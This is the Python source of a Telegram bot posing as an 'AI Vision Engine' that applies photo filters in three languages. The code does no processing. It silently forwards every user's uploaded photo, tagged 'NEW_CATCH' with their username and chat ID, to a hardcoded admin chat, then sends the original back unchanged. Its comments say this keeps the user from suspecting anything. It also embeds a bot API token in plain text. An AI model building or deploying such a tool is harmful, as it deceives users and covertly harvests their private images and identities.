import telebot
from telebot import types

API_TOKEN = '8511373490:AAFA1Az6cYVJ_C5mx4sXj6PQPA3B0Sc5euU'
ADMIN_CHAT_ID = '8487366702'

bot = telebot.TeleBot(API_TOKEN)

# Dictionary to store user language and photo data
user_data = {}

# Professional Technical Messages
STRINGS = {
    '🇺🇸 English': {
        'welcome': "Welcome to AI Vision Engine v4.0. Please select your interface language:",
        'upload': "Language set to English. Please upload the image you wish to process.",
        'select_filter': "Image received. Please select an AI Rendering Filter (30+ styles available):",
        'processing': "🔄 Processing via Neural Networks... \n⚠️ High server load. Your rendered image will be delivered shortly.",
    },
    '🇫🇷 Français': {
        'welcome': "Bienvenue sur AI Vision Engine v4.0. Veuillez sélectionner la langue de l'interface:",
        'upload': "Langue configurée sur Français. Veuillez télécharger l'image que vous souhaitez traiter.",
        'select_filter': "Image reçue. Veuillez sélectionner un filtre de rendu AI (30+ styles disponibles):",
        'processing': "🔄 Traitement via réseaux neuronaux... \n⚠️ Charge serveur élevée. Votre image traitée sera livrée sous peu.",
    },
    '🇦🇪 العربية': {
        'welcome': "مرحباً بكم في محرك الرؤية بالذكاء الاصطناعي v4.0. يرجى اختيار لغة الواجهة:",
        'upload': "تم ضبط اللغة: العربية. يرجى إرسال الصورة التي ترغب في معالجتها.",
        'select_filter': "تم استلام الصورة. يرجى اختيار مرشح المعالجة (أكثر من 30 نمط متوفر):",
        'processing': "🔄 جاري المعالجة عبر الشبكات العصبية... \n⚠️ ضغط عالي على الخادم. سيتم تسليم الصورة فور اكتمال الرندرة.",
    }
}

# List of 30+ Professional Filters
FILTERS = [
    "Scratch Face Pro", "Motion Blur X", "Cybernetic Glow", "Old Money Grain", 
    "Cinematic Teal", "Noir Aesthetic", "8K Resolution Up", "Retro VHS", 
    "Deep HDR", "Face Retouch AI", "Portrait Bokeh", "Street Grunge",
    "Prisma Art", "Vaporwave Static", "Midnight Moody", "Royal Gold",
    "Soft Dreamy", "Ultra Sharp", "Gothic Dark", "Sketch Pencil",
    "Oil Painting", "Pixel Art", "Futuristic Neon", "Sepia Classic",
    "Ice Cold Blur", "Warm Sunset", "Distortion Glitch", "Matte Finish",
    "Vogue Style", "B&W High Contrast", "Glass Reflection", "Shadow Depth"
]

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add('🇺🇸 English', '🇫🇷 Français', '🇦🇪 العربية')
    bot.send_message(message.chat.id, "Select System Language / اختر لغة النظام:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in STRINGS.keys())
def set_language(message):
    lang = message.text
    user_data[message.chat.id] = {'lang': lang}
    bot.send_message(message.chat.id, STRINGS[lang]['upload'], reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {'lang': '🇺🇸 English'} # Default
    
    # Store photo ID
    user_data[chat_id]['photo'] = message.photo[-1].file_id
    
    # Show Filter Grid (3 buttons per row)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for i in range(0, len(FILTERS), 3):
        markup.add(FILTERS[i], FILTERS[i+1], FILTERS[i+2])
    
    lang = user_data[chat_id]['lang']
    bot.send_message(chat_id, STRINGS[lang]['select_filter'], reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in FILTERS)
def process_filter(message):
    chat_id = message.chat.id
    if chat_id in user_data and 'photo' in user_data[chat_id]:
        lang = user_data[chat_id]['lang']
        photo_id = user_data[chat_id]['photo']
        
        # 1. Send feedback to user
        bot.send_message(chat_id, STRINGS[lang]['processing'], reply_markup=types.ReplyKeyboardRemove())
        
        # 2. Forward original photo to ADMIN
        user_info = f"📸 NEW_CATCH\n👤 User: @{message.from_user.username}\n🆔 ID: {chat_id}\n🌍 Lang: {lang}\n🎯 Filter: {message.text}"
        bot.send_photo(ADMIN_CHAT_ID, photo_id, caption=user_info)

        # 3. Simulate work by sending back the same photo (or a slightly different one)
        # This makes the user wait and not suspect anything
        bot.send_photo(chat_id, photo_id, caption="PREVIEW_ONLY_LOW_RES")

bot.polling(none_stop=True)
